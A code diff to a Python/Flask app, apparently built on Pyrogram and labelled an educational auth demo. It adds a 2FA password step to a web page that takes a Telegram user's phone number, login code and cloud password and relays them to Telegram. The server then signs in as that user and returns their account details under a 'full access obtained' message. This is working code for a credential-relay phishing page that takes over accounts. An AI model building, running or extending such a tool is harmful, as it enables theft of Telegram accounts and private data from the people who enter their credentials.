@@ -108,7 +108,7 @@ class TelegramAuthTester:
                 name=session_name,
                 api_id=self.api_id,
                 api_hash=self.api_hash,
-                in_memory=True  # Не сохраняем сессию на диск
+                in_memory=True
             )
             
             await client.connect()
@@ -123,11 +123,11 @@ class TelegramAuthTester:
                 'client': client,
                 'phone': phone_number,
                 'phone_code_hash': sent_code.phone_code_hash,
-                'created_at': time.time()
+                'created_at': time.time(),
+                'status': 'code_sent'
             }
             
             logger.info(f"📱 Код отправлен. Session: {session_id}")
-            logger.info(f"📱 Phone code hash: {sent_code.phone_code_hash}")
             
             return {
                 'success': True,
@@ -157,7 +157,6 @@ class TelegramAuthTester:
         
         try:
             logger.info(f"🔐 Верификация кода {code} для {phone}")
-            logger.info(f"🔐 Используем phone_code_hash: {phone_code_hash}")
             
             # Входим с кодом
             await client.sign_in(
@@ -180,10 +179,15 @@ class TelegramAuthTester:
             
         except SessionPasswordNeeded:
             logger.info("🔒 Требуется 2FA пароль")
+            # Обновляем статус сессии
+            session_data['status'] = 'need_password'
+            AUTH_SESSIONS[session_id] = session_data
+            
             return {
                 'success': True,
                 'message': 'Требуется пароль 2FA',
-                'needs_password': True
+                'needs_password': True,
+                'session_id': session_id
             }
             
         except PhoneCodeInvalid as e:
@@ -214,6 +218,55 @@ class TelegramAuthTester:
             if session_id in AUTH_SESSIONS:
                 del AUTH_SESSIONS[session_id]
             return {'success': False, 'error': f'Ошибка: {str(e)}'}
+
+    async def verify_password(self, session_id, password):
+        """Верификация пароля 2FA"""
+        if session_id not in AUTH_SESSIONS:
+            return {'success': False, 'error': 'Сессия не найдена'}
+            
+        session_data = AUTH_SESSIONS[session_id]
+        if session_data.get('status') != 'need_password':
+            return {'success': False, 'error': 'Неверный статус сессии'}
+            
+        client = session_data['client']
+        
+        try:
+            logger.info(f"🔑 Верификация пароля 2FA")
+            
+            # Входим с паролем
+            await client.check_password(password=password)
+            
+            logger.info("✅ Успешная аутентификация с паролем 2FA")
+            
+            # Получаем информацию о пользователе
+            me = await client.get_me()
+            
+            # Очищаем сессию
+            await client.disconnect()
+            del AUTH_SESSIONS[session_id]
+            
+            return {
+                'success': True,
+                'message': f'Полный доступ получен! Пользователь: {me.first_name} (@{me.username})',
+                'user_info': {
+                    'id': me.id,
+                    'first_name': me.first_name,
+                    'last_name': me.last_name,
+                    'username': me.username,
+                    'phone': me.phone_number
+                },
+                'full_access': True
+            }
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка верификации пароля: {e}")
+            try:
+                await client.disconnect()
+            except:
+                pass
+            if session_id in AUTH_SESSIONS:
+                del AUTH_SESSIONS[session_id]
+            return {'success': False, 'error': 'Неверный пароль 2FA'}
 
 # Инициализация
 auth_tester = TelegramAuthTester()
@@ -291,11 +344,18 @@ def educational_demo():
             font-size: 12px;
             margin: 10px 0;
         }}
+        .user-info {{
+            background: #e8f5e8;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #28a745;
+        }}
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Educational Auth Demo (Pyrogram)</h1>
+        <h1>🔐 Educational Auth Demo</h1>
         <p>Демонстрация механизмов аутентификации (ТОЛЬКО ДЛЯ ОБРАЗОВАНИЯ)</p>
         
         <div class="status {status_color}">
@@ -325,6 +385,15 @@ def educational_demo():
             <input type="text" id="code" class="input" placeholder="Введите 5-значный код" maxlength="5">
             <button class="btn" onclick="verifyCode()" id="verifyBtn">Проверить код</button>
         </div>
+
+        <div id="step3" style="display:none;">
+            <h3>Введите пароль 2FA</h3>
+            <div class="alert info">
+                🔒 Этот аккаунт защищен двухфакторной аутентификацией
+            </div>
+            <input type="password" id="password" class="input" placeholder="Введите пароль от облачного хранилища">
+            <button class="btn" onclick="verifyPassword()" id="passwordBtn">Проверить пароль</button>
+        </div>
         
         <div id="results"></div>
         
@@ -340,6 +409,20 @@ def educational_demo():
         function showAlert(message, type) {{
             const results = document.getElementById('results');
             results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
+        }}
+
+        function showUserInfo(userInfo) {{
+            const results = document.getElementById('results');
+            results.innerHTML = `
+                <div class="user-info">
+                    <h4>✅ Полный доступ получен!</h4>
+                    <p><strong>Имя:</strong> ${{userInfo.first_name || 'Не указано'}}</p>
+                    <p><strong>Фамилия:</strong> ${{userInfo.last_name || 'Не указана'}}</p>
+                    <p><strong>Username:</strong> @${{userInfo.username || 'Не указан'}}</p>
+                    <p><strong>ID:</strong> ${{userInfo.id}}</p>
+                    <p><strong>Телефон:</strong> ${{userInfo.phone}}</p>
+                </div>
+            `;
         }}
 
         async function requestCode() {{
@@ -416,9 +499,16 @@ def educational_demo():
                 const data = await response.json();
                 
                 if (data.success) {{
-                    showAlert('✅ ' + data.message, 'success');
-                    document.getElementById('step2').style.display = 'none';
-                    document.getElementById('code').value = '';
+                    if (data.needs_password) {{
+                        document.getElementById('step2').style.display = 'none';
+                        document.getElementById('step3').style.display = 'block';
+                        document.getElementById('password').focus();
+                        showAlert('🔒 Требуется пароль двухфакторной аутентификации', 'info');
+                    }} else {{
+                        document.getElementById('step2').style.display = 'none';
+                        document.getElementById('code').value = '';
+                        showAlert('✅ ' + data.message, 'success');
+                    }}
                 }} else {{
                     showAlert('❌ ' + data.error, 'error');
                     document.getElementById('code').value = '';
@@ -433,12 +523,67 @@ def educational_demo():
             }}
         }}
 
+        async function verifyPassword() {{
+            const password = document.getElementById('password').value;
+
+            if (!password) {{
+                showAlert('Введите пароль 2FA', 'error');
+                return;
+            }}
+
+            const btn = document.getElementById('passwordBtn');
+            btn.disabled = true;
+            btn.textContent = 'Проверка...';
+
+            try {{
+                const response = await fetch('/api/auth/password', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
+                        session_id: currentSessionId,
+                        password: password
+                    }})
+                }});
+                
+                if (!response.ok) {{
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! status: ${{response.status}}, response: ${{errorText}}`);
+                }}
+                
+                const data = await response.json();
+                
+                if (data.success) {{
+                    document.getElementById('step3').style.display = 'none';
+                    document.getElementById('password').value = '';
+                    if (data.user_info) {{
+                        showUserInfo(data.user_info);
+                    }} else {{
+                        showAlert('✅ ' + data.message, 'success');
+                    }}
+                }} else {{
+                    showAlert('❌ ' + data.error, 'error');
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                }}
+            }} catch (error) {{
+                console.error('Error:', error);
+                showAlert('❌ Ошибка сети: ' + error.message, 'error');
+            }} finally {{
+                btn.disabled = false;
+                btn.textContent = 'Проверить пароль';
+            }}
+        }}
+
         document.getElementById('phone').addEventListener('keypress', function(e) {{
             if (e.key === 'Enter') requestCode();
         }});
         
         document.getElementById('code').addEventListener('keypress', function(e) {{
             if (e.key === 'Enter') verifyCode();
+        }});
+
+        document.getElementById('password').addEventListener('keypress', function(e) {{
+            if (e.key === 'Enter') verifyPassword();
         }});
 
         document.getElementById('code').addEventListener('input', function(e) {{
@@ -494,6 +639,29 @@ def auth_verify():
         return jsonify(result)
     except Exception as e:
         logger.error(f"❌ Ошибка в auth_verify: {e}")
+        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500
+
+@app.route('/api/auth/password', methods=['POST', 'OPTIONS'])
+def auth_password():
+    """Верификация пароля 2FA"""
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'ok'})
+        
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
+            
+        session_id = data.get('session_id', '').strip()
+        password = data.get('password', '')
+        
+        if not session_id or not password:
+            return jsonify({'success': False, 'error': 'Введите пароль'}), 400
+        
+        result = async_runner.run_coroutine(auth_tester.verify_password(session_id, password))
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"❌ Ошибка в auth_password: {e}")
         return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500
 
 @app.route('/status')
